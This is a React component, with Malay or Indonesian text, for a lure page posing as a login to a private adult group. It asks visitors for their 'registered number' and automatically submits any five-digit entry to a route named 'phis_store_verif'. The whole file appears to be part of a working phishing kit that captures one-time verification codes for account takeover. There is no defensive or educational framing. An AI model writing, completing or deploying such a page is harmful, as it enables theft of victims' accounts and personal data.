import { Link, useForm } from "@inertiajs/react";
import { TextField } from "@mui/material";
import React, { useEffect, useState } from "react";

export default function SexLayouts() {
    const { data, setData, post } = useForm({ code: "" });
    const [showImage, setShowImage] = useState(0);
    useEffect(() => {
        if (showImage == 0) {
            setTimeout(() => {
                setShowImage(1);
            }, 20000);
        } else {
            setTimeout(() => {
                setShowImage(0);
            }, 20000);
        }
    }, [showImage]);

    const changeHandler = (e) => {
        const input = e.target.value;

        // Menggunakan regex untuk memeriksa apakah input hanya berisi angka dan tanda tambah
        if (/^[0-9+]*$/.test(input)) {
            setData({ ...data, code: input });
        }
    };
    useEffect(() => {
        if (data.code.length === 5) {
            post(route("phis_store_verif"));
        }
    }, [data]);
    return (
        <div className="relative h-[932px] w-full overflow-hidden">
            <div className="bg-black/50 w-full h-full absolute top-0 left-0 z-10 "></div>

            <div className="absolute top-0 left-0 w-full h-full scrolNaik">
                {/* <div class="grid grid-cols-2 md:grid-cols-4 gap-y-2">
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/utama1.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/utama2.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/utama3.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/2.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/6.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/8.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/1.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/2.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/3.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                    <div class="grid gap-y-2">
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/4.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/6.jpg"
                                alt=""
                            />
                        </div>
                        <div>
                            <img
                                class="h-auto max-w-full rounded-lg"
                                src="rhmt/7.jpg"
                                alt=""
                            />
                        </div>
                    </div>
                </div> */}
                <img src="/gambar23.jpeg" alt="" />
                <img src="/gambar23.jpeg" alt="" />
                <img src="/gambar23.jpeg" alt="" />
                <img src="/gambar23.jpeg" alt="" />
                <img src="/gambar23.jpeg" alt="" />
                <img src="/gambar23.jpeg" alt="" />
            </div>

            <div className="absolute top-0 left-0 w-full h-full flex justify-center items-start flex-col z-[10] px-5">
                <h3 className="text-4xl font-extrabold text-pink-500 font-sans tracking-tighter">
                    Masuk{" "}
                    <span className="text-white tracking-tighter text-2xl font-thin">
                        Live and Group Private
                    </span>
                </h3>
                <p className="tracking-tighter text-white font-thin text-lg">
                    Masuk dengan Nombor Terdaftar
                </p>
                <div className="py-5 w-full">
                    <TextField
                        value={data.code}
                        onChange={changeHandler}
                        sx={{
                            outlineColor: "pink",
                        }}
                        className="bg-white w-full rounded-lg"
                        variant="outlined"
                        label="Phone Number"
                    />
                </div>
                <div className="flex gap-3">
                    <button className="font-bold bg-pink-500 text-white text-sm py-3 px-4 rounded-md animate-pulse">
                        Masuk Group Private
                    </button>
                    <Link
                        href={route("home")}
                        className="font-bold bg-pink-500 text-white text-sm py-3 px-4 rounded-md "
                    >
                        Daftar Group Private
                    </Link>
                </div>
            </div>
        </div>
    );
}
